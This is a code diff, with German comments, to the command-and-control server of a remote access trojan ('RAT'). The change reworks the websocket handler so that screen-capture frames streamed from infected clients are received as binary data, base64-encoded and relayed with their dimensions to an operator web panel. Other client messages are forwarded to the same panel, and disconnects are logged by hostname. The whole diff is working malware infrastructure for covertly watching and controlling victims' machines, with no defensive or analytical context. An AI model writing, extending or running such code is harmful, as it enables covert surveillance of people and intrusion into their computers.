@@ -172,15 +172,33 @@ async def rat_client_endpoint(websocket: WebSocket):
     await send_client_list()
 
     try:
+        screen_meta = None
         while True:
-            data = await websocket.receive_json()
-            # --- Screen-Frame Weiterleitung ---
-            if data.get('action') == 'screen_frame':
-                await send_to_web_ui({'action':'screen_frame','client_id': client_id,'data': data.get('data')})
-                continue
-            # --- Standard-Kommandos ---
-            data["client_id"] = client_id
-            await send_to_web_ui(data)
+            data = await websocket.receive()
+            if data["type"] == "websocket.receive":
+                if "bytes" in data and data["bytes"]:
+                    # Binärdaten: Screenstream-Frame
+                    if screen_meta:
+                        await send_to_web_ui({
+                            "action": "screen_frame",
+                            "client_id": client_id,
+                            "img_bytes": base64.b64encode(data["bytes"]).decode("ascii"),
+                            "width": screen_meta.get("width"),
+                            "height": screen_meta.get("height"),
+                        })
+                        screen_meta = None
+                    continue
+                elif "text" in data and data["text"]:
+                    try:
+                        meta = json.loads(data["text"])
+                        if meta.get("action") == "screen_frame":
+                            screen_meta = meta
+                            continue
+                        # Standard-Kommandos
+                        meta["client_id"] = client_id
+                        await send_to_web_ui(meta)
+                    except Exception:
+                        pass
     except WebSocketDisconnect:
         print(f"[-] RAT-Client {client_id} ({CLIENT_INFOS.get(client_id, {}).get('hostname', client_id)}) hat die Verbindung getrennt.")
     finally:
